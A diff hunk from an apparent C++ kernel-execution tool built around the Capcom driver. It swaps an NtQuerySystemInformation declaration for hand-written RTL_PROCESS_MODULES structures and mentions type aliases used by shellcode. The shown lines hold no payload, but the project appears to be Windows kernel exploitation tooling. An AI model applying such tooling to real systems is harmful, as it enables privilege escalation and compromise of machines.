@@ -18,16 +18,33 @@
 
 #include "KernelExec.h"
 #include "CapcomDriver.h"
-
 #include <winternl.h>
 #include <cstring>
 #include <stdexcept>
 #include <vector>
 
-// Undocumented NT API — triggers HalDispatchTable dispatch.
-extern "C" NTSTATUS NTAPI NtQuerySystemInformation(
-    SYSTEM_INFORMATION_CLASS SystemInformationClass,
-    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+// RTL_PROCESS_MODULES is not exposed in some Windows SDK versions.
+// Define it manually — returned by NtQuerySystemInformation(SystemModuleInformation=11).
+typedef struct _RTL_PROCESS_MODULE_INFORMATION {
+    HANDLE Section;
+    PVOID MappedBase;
+    PVOID ImageBase;
+    ULONG ImageSize;
+    ULONG Flags;
+    USHORT LoadOrderIndex;
+    USHORT InitOrderIndex;
+    USHORT LoadCount;
+    USHORT OffsetToFileName;
+    UCHAR FullPathName[256];
+} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
+
+typedef struct _RTL_PROCESS_MODULES {
+    ULONG NumberOfModules;
+    RTL_PROCESS_MODULE_INFORMATION Modules[1];
+} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
+
+// Undocumented NT API — declared in winternl.h.
+// Needs ntdll linked explicitly (added in CMakeLists.txt).
 
 // Kernel function type aliases used by the shellcode.
 using ZwAllocateVirtualMemory_t = NTSTATUS(NTAPI*)(
